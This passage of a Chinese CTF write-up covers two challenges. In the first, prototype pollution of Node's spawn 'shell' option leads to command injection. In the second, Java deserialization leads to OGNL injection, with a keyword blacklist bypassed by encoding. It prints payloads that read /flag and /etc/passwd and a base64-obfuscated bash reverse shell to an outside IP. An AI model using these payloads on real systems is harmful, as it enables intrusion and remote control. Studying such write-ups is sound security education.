启动子进程运行 ping 命令</span></span><br><span class="line">    <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>], <span class="comment">// 子进程的 stdio 设置：stdin 继承父进程，stdout/stderr 使用 pipe（以便读取）</span></span><br><span class="line">    <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;, <span class="comment">// 继承当前环境变量并额外设置 LC_ALL 为 C.UTF-8（控制区域设置/编码）</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&quot;&quot;</span>; <span class="comment">// 将用来累加命令输出的字符串</span></span><br><span class="line">  proc.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> (output += data)); <span class="comment">// 当子进程 stdout 有数据时，把数据追加到 output（注意 data 通常是 Buffer）</span></span><br><span class="line">  proc.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> (output += data)); <span class="comment">// 当子进程 stderr 有数据时，也追加到 output</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> proc.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, resolve)); <span class="comment">// 等待子进程 &#x27;close&#x27; 事件（进程退出并关闭 stdio）后继续</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> output; <span class="comment">// 返回收集到的输出字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码有点晦涩难懂</p>
+<p>让我们以post传入127.0.0.1来一步步解释</p>
+<p><img src="../images/image-20250921200238740.png" alt="image-20250921200238740" /></p>
+<h4 id="第1步函数调用"><a class="markdownIt-Anchor" href="#第1步函数调用"></a> 第1步：函数调用</h4>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">pingAction</span>(<span class="string">&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1\&quot;&#125;&quot;</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>传入第一个参数：字符串 <code>&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1\&quot;&#125;&quot;</code></li>
+<li>第二个参数使用默认值：<code>4</code>（ping 4次）</li>
+</ul>
+<h4 id="第2步json解析-进入自定义解析器"><a class="markdownIt-Anchor" href="#第2步json解析-进入自定义解析器"></a> 第2步：JSON解析 - 进入自定义解析器</h4>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">body</span>: &#123; <span class="attr">ip</span>?: <span class="built_in">string</span> &#125; = <span class="title function_">jsonParse</span>(data);</span><br></pre></td></tr></table></figure>
+<p>传入字符串：<code>&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1\&quot;&#125;&quot;</code></p>
+<h5 id="21-初始检查"><a class="markdownIt-Anchor" href="#21-初始检查"></a> <strong>2.1 初始检查</strong></h5>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(str.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>) &amp;&amp; str.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&quot;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>str.startsWith(&quot;&#123;&quot;)</code> → <code>true</code></li>
+<li><code>str.endsWith(&quot;&#125;&quot;)</code> → <code>true</code></li>
+<li>通过检查，继续解析</li>
+</ul>
+<h5 id="22-提取内部内容"><a class="markdownIt-Anchor" href="#22-提取内部内容"></a> <strong>2.2 提取内部内容</strong></h5>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.<span class="title function_">slice</span>(<span class="number">1</span>, str.<span class="property">length</span> - <span class="number">1</span>) <span class="comment">// 去掉外层的 &#123;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>得到：<code>&quot;\&quot;ip\&quot;:\&quot;127.0.0.1\&quot;&quot;</code></p>
+<h5 id="23-正则表达式匹配"><a class="markdownIt-Anchor" href="#23-正则表达式匹配"></a> <strong>2.3 正则表达式匹配</strong></h5>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> matches = str.<span class="title function_">slice</span>(<span class="number">1</span>, str.<span class="property">length</span> - <span class="number">1</span>).<span class="title function_">matchAll</span>(</span><br><span class="line">  <span class="regexp">/(?:^|,)\s*&quot;(?&lt;key&gt;\w+)&quot;\s*:\s*(?&lt;value&gt;\d+|(?:true|false)|&quot;(?:\\.|[^&quot;])*&quot;|\&#123;.+?&#125;)/g</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p><strong>匹配结果：</strong></p>
+<ul>
+<li>匹配到：<code>&quot;ip&quot;:&quot;127.0.0.1&quot;</code></li>
+<li>groups: <code>&#123;key: &quot;ip&quot;, value: &quot;\&quot;127.0.0.1\&quot;&quot;&#125;</code></li>
+</ul>
+<h5 id="24-值处理-字符串类型"><a class="markdownIt-Anchor" href="#24-值处理-字符串类型"></a> <strong>2.4 值处理 - 字符串类型</strong></h5>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (value.<span class="title function_">startsWith</span>(<span class="string">&#x27;&quot;&#x27;</span>)) &#123;</span><br><span class="line">  ret[key] = value</span><br><span class="line">    .<span class="title function_">slice</span>(<span class="number">1</span>, value.<span class="property">length</span> - <span class="number">1</span>) <span class="comment">// 去掉引号：&quot;127.0.0.1&quot; → 127.0.0.1</span></span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\\(u([0-9a-fA-F]&#123;4&#125;)|.)/g</span>, <span class="function">(<span class="params">_, <span class="attr">m</span>: <span class="built_in">string</span>, <span class="attr">code</span>: <span class="built_in">string</span></span>) =&gt;</span></span><br><span class="line">      m === <span class="string">&quot;u&quot;</span></span><br><span class="line">        ? <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(code, <span class="number">16</span>))</span><br><span class="line">        : (&#123; <span class="attr">b</span>: <span class="string">&quot;\b&quot;</span>, <span class="attr">f</span>: <span class="string">&quot;\f&quot;</span>, <span class="attr">n</span>: <span class="string">&quot;\n&quot;</span>, <span class="attr">r</span>: <span class="string">&quot;\r&quot;</span>, <span class="attr">t</span>: <span class="string">&quot;\t&quot;</span> &#125;[m] ?? m)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>value</code> 是 <code>&quot;\&quot;127.0.0.1\&quot;&quot;</code>，以 <code>&quot;</code> 开头，进入字符串处理</li>
+<li><code>slice(1, value.length - 1)</code> → 去掉外层引号：<code>&quot;127.0.0.1&quot;</code></li>
+<li>检查转义字符（这里没有转义字符，所以直接返回原字符串）</li>
+<li>最终：<code>ret[&quot;ip&quot;] = &quot;127.0.0.1&quot;</code></li>
+</ul>
+<h5 id="25-返回解析结果"><a class="markdownIt-Anchor" href="#25-返回解析结果"></a> <strong>2.5 返回解析结果</strong></h5>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ret; <span class="comment">// &#123; ip: &quot;127.0.0.1&quot; &#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="第3步准备ping命令参数"><a class="markdownIt-Anchor" href="#第3步准备ping命令参数"></a> 第3步：准备ping命令参数</h4>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">`-c<span class="subst">$&#123;count&#125;</span>`</span>, body.<span class="property">ip</span>!, <span class="string">&quot;-W1&quot;</span>], &#123;</span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>],</span><br><span class="line">  <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>命令：<code>ping</code></li>
+<li>参数：<code>[&quot;-c4&quot;, &quot;127.0.0.1&quot;, &quot;-W1&quot;]</code></li>
+<li>环境变量：设置 <code>LC_ALL=&quot;C.UTF-8&quot;</code> 确保输出为英文格式</li>
+</ul>
+<h4 id="第4步执行ping命令并收集输出"><a class="markdownIt-Anchor" href="#第4步执行ping命令并收集输出"></a> 第4步：执行ping命令并收集输出</h4>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">proc.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> (output += data));</span><br><span class="line">proc.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> (output += data));</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> proc.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, resolve));</span><br></pre></td></tr></table></figure>
+<p><strong>实际执行的系统命令：</strong></p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -<span class="variable constant_">W1</span></span><br></pre></td></tr></table></figure>
+<h4 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h4>
+<p><img src="../images/1574497668.png" alt="img" /></p>
+<p>发现这里存在和merge一样的功能，也就是存在原型链污染漏洞</p>
+<p>假设我们构造<code>[&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1;ls\&quot;&#125;&quot;]</code>进行命令拼接发现是不行的，因为spawn默认只能传递参数</p>
+<p>查询spawn的行为：</p>
+<p><img src="../images/3841983962-17584572156577.png" alt="img" /></p>
+<p><img src="../images/2866340169.png" alt="img" /></p>
+<p>所以想执行命令可以污染spawn的shell属性为true或者bash</p>
+<h3 id="法一-shell为true"><a class="markdownIt-Anchor" href="#法一-shell为true"></a> 法一  shell为true</h3>
+<p>直接污染shell为true:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#123;\&quot;ip\&quot;: \&quot;127.0.0.1;cat /flag\&quot;, \&quot;__proto__\&quot;: &#123;\&quot;shell\&quot;: true&#125;&#125;&quot;]</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250921202350092.png" alt="image-20250921202350092" /></p>
+<p>会发现恶意命令并没有执行，<code>cat</code> 命令拼接了 <code>W</code> 参数</p>
+<p>再次构造请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#123;\&quot;ip\&quot;: \&quot;127.0.0.1;cat /flag;ping -c4 127.0.0.1\&quot;, \&quot;__proto__\&quot;: &#123;\&quot;shell\&quot;: true&#125;&#125;&quot;]</span><br></pre></td></tr></table></figure>
+<p>让后面的ping去拼接-W参数</p>
+<p>成功执行命令。</p>
+<p><img src="../images/image-20250921202604417.png" alt="image-20250921202604417" /></p>
+<p>成功得到flag</p>
+<h3 id="法二-shell为bash等"><a class="markdownIt-Anchor" href="#法二-shell为bash等"></a> 法二 shell为bash等</h3>
+<p>污染shell为bash</p>
+<p>后面引自<a target="_blank" rel="noopener" href="http://www.chhhchhoh.cn/archives/1243/">2024湖南省大学生程序设计竞赛-网络攻防赛(复盘) - CHHHCHHOH</a></p>
+<p>指定shell为bash之后我们就可以拼接命令了，而且成功执行了。为什么呢？</p>
+<p><a target="_blank" rel="noopener" href="http://www.chhhchhoh.cn/usr/uploads/2024/10/1186353468.png"><img src="../images/1186353468.png" alt="img" /></a><br />
+先看一下不自定义shell的情况下会怎样</p>
+<p><a target="_blank" rel="noopener" href="http://www.chhhchhoh.cn/usr/uploads/2024/10/2864072119.png"><img src="../images/2864072119.png" alt="img" /></a><br />
+定义了之后args变成了<code>bash -c</code></p>
+<p><a target="_blank" rel="noopener" href="http://www.chhhchhoh.cn/usr/uploads/2024/10/2167887636.png"><img src="../images/2167887636.png" alt="img" /></a><br />
+我们改shell为python也可以，所以只要shell的值有<code>-c</code>就可以了。</p>
+<p><a target="_blank" rel="noopener" href="http://www.chhhchhoh.cn/usr/uploads/2024/10/3196509241.png"><img src="../images/3196509241.png" alt="img" /><br />
+</a></p>
+<p>payload:</p>
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#123;\&quot;__proto__\&quot;:&#123;\&quot;shell\&quot;:\&quot;bash\&quot;&#125;,\&quot;ip\&quot;:\&quot;www.baidu.com|cat /flag|ping www.baidu.com\&quot;&#125;&quot;]</span><br></pre></td></tr></table></figure>
+<p>直接读flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#123;\&quot;__proto__\&quot;:&#123;\&quot;shell\&quot;:\&quot;bash\&quot;&#125;,\&quot;ip\&quot;:\&quot;127.0.0.1;cat /flag;ping 127.0.0.1\&quot;&#125;&quot;]</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250921203137778.png" alt="image-20250921203137778" /></p>
+<h3 id="问题-为什么能污染成功"><a class="markdownIt-Anchor" href="#问题-为什么能污染成功"></a> 问题-为什么能污染成功</h3>
+<p>重点是<br />
+<code>const proc = spawn(&quot;ping&quot;, [-c$&#123;count&#125;, ip, &quot;-W1&quot;],&#123;&#125;);</code>里的{}，我们之前给{}的原型污染了一个shell属性，所以这个options里面就也有了这个属性，如果去掉<code>&#123;&#125;</code>，就无法污染成功。</p>
+<h2 id="内网靶机ezbypass"><a class="markdownIt-Anchor" href="#内网靶机ezbypass"></a> [内网靶机]ezbypass</h2>
+<h3 id="读源码"><a class="markdownIt-Anchor" href="#读源码"></a> 读源码</h3>
+<p><img src="../images/image-20250921204515919.png" alt="image-20250921204515919" /></p>
+<p><img src="../images/image-20250921204521754.png" alt="image-20250921204521754" /></p>
+<p><img src="../images/image-20250921204527038.png" alt="image-20250921204527038" /></p>
+<p>开局给了这么个提示，叫我们拿源码，但我用file://也拿不到，后面看了一下：<br />
+<img src="../images/image-20250922102200910.png" alt="image-20250922102200910" /></p>
+<p>file不能开头。。。</p>
+<p>用<code>url://file:///etc/passwd</code></p>
+<p><img src="../images/image-20250922102228454.png" alt="image-20250922102228454" /></p>
+<p>成功读取</p>
+<p><a target="_blank" rel="noopener" href="http://xn--start-vb8j60zny3aqxp.sh">根据给的start.sh</a>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /start.sh</span><br><span class="line">echo $FLAG &gt; /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">unset $FLAG</span><br><span class="line">su - player -c &quot;/usr/local/openjdk-17/bin/java -jar /app/ezbypass-0.0.1-SNAPSHOT.jar&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250922103904750.png" alt="image-20250922103904750" /></p>
+<p>乐</p>
+<p>比赛现场后面是直接给了源码的</p>
+<p>这里直接拿大佬的算了</p>
+<h3 id="题解1环境问题复现失败"><a class="markdownIt-Anchor" href="#题解1环境问题复现失败"></a> 题解1（环境问题复现失败）</h3>
+<p>依赖：</p>
+<p><img src="../images/image-20250922104033130.png" alt="image-20250922104033130" /></p>
+<p>反序列化入口：</p>
+<p>很标准</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Backdoor</span> &#123;  </span><br><span class="line">    <span class="meta">@ResponseBody</span>  </span><br><span class="line">    <span class="meta">@RequestMapping(value=&#123;&quot;/bbbbbackd00r&quot;&#125;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">backdoor</span><span class="params">(String data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;backdoor here&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> object.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>User类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> String desc;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, String desc)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.desc = desc;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">filter</span><span class="params">()</span> &#123;  </span><br><span class="line"><span class="comment">//       String[] BlackList = new String[] &#123;&quot;$&quot;&#125;;  </span></span><br><span class="line">        String[] BlackList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;getclass&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;runtime&quot;</span>, <span class="string">&quot;java&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;req&quot;</span>, <span class="string">&quot;new&quot;</span>, <span class="string">&quot;engine&quot;</span>&#125;;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="built_in">this</span>.desc.toLowerCase();  </span><br><span class="line">        <span class="keyword">for</span> (String keyword : BlackList) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!str.contains(keyword)) <span class="keyword">continue</span>;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, desc=&#x27;&quot;</span> + <span class="built_in">this</span>.desc + <span class="string">&quot;&#x27;&#125;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getResult</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.filter().booleanValue()) &#123;  </span><br><span class="line">                <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();  </span><br><span class="line">                <span class="keyword">return</span> Ognl.getValue((String)<span class="built_in">this</span>.desc, (Object)ognlContext).toString();  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker!&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> (OgnlException var2) &#123;  </span><br><span class="line">            System.out.println(var2);  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>User类的getResult()存在ognl注入</strong></p>
+<p>且又存在jackson，那我们直接利用jackson调用User的getter从而触发ognl注入即可</p>
+<p>经典的<code>BadAttributeValueExpException</code> 类在jdk17下无法使用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ognlCode</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;f12&quot;</span>, ognlCode);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span></span><br><span class="line">        <span class="comment">//setValue(badAttributeValueExpException, &quot;val&quot;, pojoNode);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> serialize(pojoNode);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        unserialize(a);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>现在就考虑如何绕filter了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String[] BlackList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;getclass&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;runtime&quot;</span>, <span class="string">&quot;java&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;req&quot;</span>, <span class="string">&quot;new&quot;</span>, <span class="string">&quot;engine&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="built_in">this</span>.desc.toLowerCase();</span><br><span class="line">        <span class="keyword">for</span> (String keyword : BlackList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!str.contains(keyword)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>可用ASCII编码+双重ognl绕过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;(#a = @Runtime@getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0OC4yMTEuNDcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;))&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmd)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;@String@valueOf(@Character@valueOf(<span class="subst">&#123;<span class="built_in">ord</span>(cmd[i])&#125;</span>))&quot;</span>, end=<span class="string">&quot;+&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250922112407681.png" alt="image-20250922112407681" /></p>
+<p>额，但我这里失败了，我想可能和JDK版本有关，我这时是JDK8的，而环境需要jdk17的</p>
+<h3 id="题解2多余"><a class="markdownIt-Anchor" href="#题解2多余"></a> 题解2（多余）</h3>
+<p>在jdk17下反射有限制但是可以利用<code>Unsafe</code>绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> test2.class; <span class="comment">//修改为你所在的类</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(currentClass, addr, baseModule);</span><br></pre></td></tr></table></figure>
+<p>这样之后就能正常反射</p>
